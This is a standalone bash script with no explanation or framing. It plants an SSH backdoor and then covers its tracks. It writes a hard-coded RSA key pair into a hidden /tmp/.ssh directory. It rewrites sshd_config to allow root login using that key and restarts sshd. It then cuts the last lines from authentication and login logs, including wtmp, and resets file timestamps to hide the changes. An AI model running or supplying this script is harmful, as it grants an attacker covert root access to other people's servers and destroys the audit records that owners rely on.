#!/bin/bash
mkdir -p /tmp/.ssh/
chmod 600 /tmp/.ssh/*
chmod 700 /tmp/.ssh
cat << EOF > /tmp/.ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAtHFRMVgyCwkmcZ4mMibpSkh55Oj1Tdx7L/rrAXHNKHKqLVbcxAS63BzWM80mcMVTVaxkWHkGS/MrET/NEvdch37h8quoDicQ8yw1MEKYA9Z0WwJ5iWX/fwMreOGMlbUt/QUx6LR4QPaJU+tL8aJ5yyjr/aTtRFOQF7Gu7stXouyhJh0NnSPiQ+DTXUboS7cxrsNWHve/8tkBE53yNwb2TBPE1dNUR02KJWmKB8Rtzh5vhJPfzy4kNf+x8Tc7ya/Uv8LGt3K/PKDjRR+k/p1pbj+CaHNWwZ5W91oBJoAgjCKIOi7rY/nJzs/L5Fw4OXzETXCopjwsv4PVid16ry73LQ==
EOF
cat << EOF > /tmp/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEoQIBAAKCAQEAtHFRMVgyCwkmcZ4mMibpSkh55Oj1Tdx7L/rrAXHNKHKqLVbc
xAS63BzWM80mcMVTVaxkWHkGS/MrET/NEvdch37h8quoDicQ8yw1MEKYA9Z0WwJ5
iWX/fwMreOGMlbUt/QUx6LR4QPaJU+tL8aJ5yyjr/aTtRFOQF7Gu7stXouyhJh0N
nSPiQ+DTXUboS7cxrsNWHve/8tkBE53yNwb2TBPE1dNUR02KJWmKB8Rtzh5vhJPf
zy4kNf+x8Tc7ya/Uv8LGt3K/PKDjRR+k/p1pbj+CaHNWwZ5W91oBJoAgjCKIOi7r
Y/nJzs/L5Fw4OXzETXCopjwsv4PVid16ry73LQIBIwKCAQAKT549VX8z1KMcb2/l
m9LRC3St/q7ugaCjp/Ar99/WbPPIE5eWLCfvUhreY36KGeeBPQ0MXq/nFTWpNtiE
va2EFeEGjXdRRA+Y3fRpKGB1P3Rc+NO+tV8OkneDQBapeBFBqIaCU3SV/3WPxE17
haCPRCq+CWyk0ZM0jc97XBOi6NqsTeeUmt4YU9FGYgWyZNxf1J2S6D9xY7pb/bdm
CRmjrJAUNsI0rasF7dNRl8QJQ/etSGSih2vyKhnYdSG0qJkv9M/Yi34mP37PXdCk
KWfhXk5K4XcOZfTqGxiAZn5fNzP0g1MUTuXItswKkdDyfN+OuTEWrQPkd2Hsk16z
tI6zAoGBAOG8dROuHeYRKKXvyeHccyqnWl3QJ8BucczBAtUB4efI4fsO8w1FtXtn
QocDcrnqcTo0WM+UIyRGB1wVYIiYfabs4+eewnDuDQqUXeimpCOGDcPgZY/7eg1a
Oa95M9BZ4NTdgqwVA7dxI2pT3CTX4TIxwbCTmZFobxH3KV9dXbs3AoGBAMyiVKVG
b82I/V8dyaK9XvZ6YDLD76lEFfcIwxO7hc3S5fBlIgBnuN3WZRDwcc1Bh8b3yC8e
yR7iF5GP1OVXq7ULoqnLJy6xPK2D1/kfJKwAP2RppCNKLAucRiTmSqyv+6YlshFr
kV0lLW7XiErOEknaBh0Fztc465HmoSII+Xq7AoGAGcxlJtISC6owh/4ls2mmwwvP
0DUL23pWJgduCbcSgOPCDhBWSqjhinIzfST3KzC8e642CRg+h819LxhizchI3+CP
EygWOMq/qXAKu4DCTTPkUOZyAdOY65VIa9NWYPRUNZWoiLHxy9Jqco09uxFbkLU6
tRguzsobUoKlpH+y8NMCgYBjZMoHIjZN43PAfC68wmFTJX8uma7r0Jz0VLaF7V4/
Zm+vRxCD2pue8xslfBoEnCwBjktKFkRuFgtyllF2tY3qONn6syGo9wA3BYYoi3g2
SUNcqFcJ05G8fxrBdyuVtJAsIPAXFv12YoPIH4tXiKnMGXCvAtIuBbQ/jUbzRjAI
aQKBgQCDCUXuXyIA/GDB6/fW5Y7C60Q3YAAmr1wLqeJ7aCRvdxy4HXoD5ZIsWf9g
3AIstIoptEWe1S1UnScYaKC1mCSDBvd4WOX1i0+SYqgCrJOkeRBV2cMnYuWkfazc
F77Bwj9UyBn+esGx7D+s8tmSYj0SWZ2pNLE2jVWndm5x9065ww==
-----END RSA PRIVATE KEY-----
EOF
cp /etc/ssh/sshd_config /etc/ssh/sshd_conf
sed -i '/^PermitRootLogin*/c PermitRootLogin yes' /etc/ssh/sshd_config
sed -i '/^#PermitRootLogin*/c PermitRootLogin yes' /etc/ssh/sshd_config
sed -i '/^#AuthorizedKeysFile.*/c AuthorizedKeysFile /tmp/.ssh/id_rsa.pub' /etc/ssh/sshd_config
sed -i '/^AuthorizedKeysFile.*/c AuthorizedKeysFile /tmp/.ssh/id_rsa.pub' /etc/ssh/sshd_config
sed -i '/^#PasswordAuthentication*/c PasswordAuthentication no' /etc/ssh/sshd_config
sed -i '/^PasswordAuthentication*/c PasswordAuthentication no' /etc/ssh/sshd_config
sed -i '1i UseDNS no' /etc/ssh/sshd_config
sed -i '2i AddressFamily inet' /etc/ssh/sshd_config
systemctl restart sshd

utmpdump /var/log/wtmp >/tmp/wtmp
list=(/var/log/secure /var/log/message /var/log/auth.log /var/log/lastlog /tmp/wtmp)
for element in ${list[@]}
do
if [ ! -f ${element} ];then continue;fi
line=`cat ${element} | wc -l`
cat ${element} | head -n $(expr $line - 4) > /tmp/.kernel.log
chmod 0600 /tmp/.kernel.log
touch -r /var/log /tmp/daemon.log
mv -f /tmp/.kernel.log ${element}
touch -r /tmp/daemon.log /var/log
rm -rf /tmp/daemon.log
done
utmpdump  -r < /tmp/wtmp > /var/log/wtmp
